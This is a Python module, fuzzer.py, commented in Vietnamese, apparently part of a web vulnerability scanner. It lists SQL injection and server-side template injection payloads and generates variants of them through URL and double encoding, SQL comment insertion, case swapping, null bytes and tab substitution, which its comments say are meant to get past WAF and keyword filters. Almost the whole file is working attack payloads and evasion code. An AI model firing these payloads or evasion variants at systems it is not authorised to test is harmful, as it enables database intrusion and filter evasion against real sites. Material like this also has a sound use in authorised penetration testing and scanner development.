# ═══════════════════════════════════════════════════════════════
# fuzzer.py — Sinh biến thể payload tự động (mutation engine)
#
# Không chạy độc lập — được import bởi probe_sqli và probe_ssti
#
# Mục đích:
#   Từ 1 payload gốc → sinh ra nhiều biến thể encoding/bypass
#   Tăng coverage mà không cần liệt kê thủ công
# ═══════════════════════════════════════════════════════════════

from urllib.parse import quote, quote_plus


# ── Base payloads ────────────────────────────────────────────

SQLI_BASE = [
    # Error-based
    "'",
    "''",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1 AND 1=2",
    "1' AND '1'='2",
    # Union-based hint
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    # Time-based blind
    "1 AND SLEEP(3)",
    "1; WAITFOR DELAY '0:0:3'--",
    # SQLite specific (PHP apps thường dùng SQLite)
    "1 AND 1=1",
    "' OR sqlite_version()--",
]

SSTI_BASE = [
    # Generic math marker — 7777×7777=60481729
    "{{7777*7777}}",
    "${7777*7777}",
    "<%= 7777*7777 %>",
    # Jinja2/Twig
    "{{7*7}}",
    "{{config}}",
    "{{''.class.mro}}",
    # Freemarker
    "${7*7}",
    "<#assign x=7*7>${x}",
    # Pebble
    "{{7*7}}",
    # Velocity
    "#set($x=7*7)${x}",
    # ERB (Ruby)
    "<%= 7*7 %>",
]


# ── Mutation functions ───────────────────────────────────────

def _url_encode(payload: str) -> str:
    """URL encode ký tự đặc biệt."""
    return quote(payload, safe="")


def _double_url_encode(payload: str) -> str:
    """Double URL encode — bypass 2 tầng decode."""
    return quote(quote(payload, safe=""), safe="")


def _html_encode(payload: str) -> str:
    """HTML entity encode dấu nháy."""
    return payload.replace("'", "&#39;").replace("\"", "&quot;")


def _comment_inject(payload: str) -> str:
    """Chèn SQL comment giữa keyword để bypass WAF keyword filter."""
    return payload.replace(" ", "/**/")


def _case_swap(payload: str) -> str:
    """Đổi hoa/thường SQL keywords."""
    replacements = {
        " OR ":    " Or ",
        " AND ":   " AnD ",
        "SELECT ": "SeLeCt ",
        "UNION ":  "UnIoN ",
        "SLEEP":   "SlEeP",
        "WAITFOR": "WaItFoR",
    }
    result = payload
    for old, new in replacements.items():
        result = result.replace(old, new)
    return result


def _null_byte(payload: str) -> str:
    """Thêm null byte — bypass string termination."""
    return payload + "%00"


def _tab_space(payload: str) -> str:
    """Thay space bằng tab — bypass space filter."""
    return payload.replace(" ", "\t")


def mutate_sqli(payload: str) -> list[str]:
    """
    Sinh biến thể từ 1 SQLi payload gốc.

    Trả về list unique payloads (gồm cả gốc).
    Bỏ qua biến thể trùng với gốc.
    """
    variants = [payload]  # luôn giữ payload gốc đầu tiên
    candidates = [
        _url_encode(payload),
        _double_url_encode(payload),
        _comment_inject(payload),
        _case_swap(payload),
        _null_byte(payload),
        _tab_space(payload),
        _html_encode(payload),
    ]
    for c in candidates:
        if c and c != payload and c not in variants:
            variants.append(c)
    return variants


def mutate_ssti(payload: str) -> list[str]:
    """
    Sinh biến thể từ 1 SSTI payload gốc.
    SSTI ít cần mutation hơn SQLi vì syntax template cố định.
    """
    variants = [payload]
    candidates = [
        _url_encode(payload),
        _double_url_encode(payload),
        # Thêm spaces
        payload.replace("{{", "{{ ").replace("}}", " }}"),
    ]
    for c in candidates:
        if c and c != payload and c not in variants:
            variants.append(c)
    return variants


def get_sqli_payloads() -> list[str]:
    """
    Trả về danh sách đầy đủ SQLi payloads:
    base payloads + mutations của mỗi cái.
    Đã dedup.
    """
    all_payloads = []
    seen = set()
    for base in SQLI_BASE:
        for variant in mutate_sqli(base):
            if variant not in seen:
                seen.add(variant)
                all_payloads.append(variant)
    return all_payloads


def get_ssti_payloads() -> list[str]:
    """
    Trả về danh sách đầy đủ SSTI payloads:
    base payloads + mutations.
    Đã dedup.
    """
    all_payloads = []
    seen = set()
    for base in SSTI_BASE:
        for variant in mutate_ssti(base):
            if variant not in seen:
                seen.add(variant)
                all_payloads.append(variant)
    return all_payloads


if __name__ == "__main__":
    sqli = get_sqli_payloads()
    ssti = get_ssti_payloads()
    print(f"SQLi payloads: {len(sqli)}")
    for p in sqli[:5]:
        print(f"  {p!r}")
    print(f"\nSSTI payloads: {len(ssti)}")
    for p in ssti[:5]:
        print(f"  {p!r}")
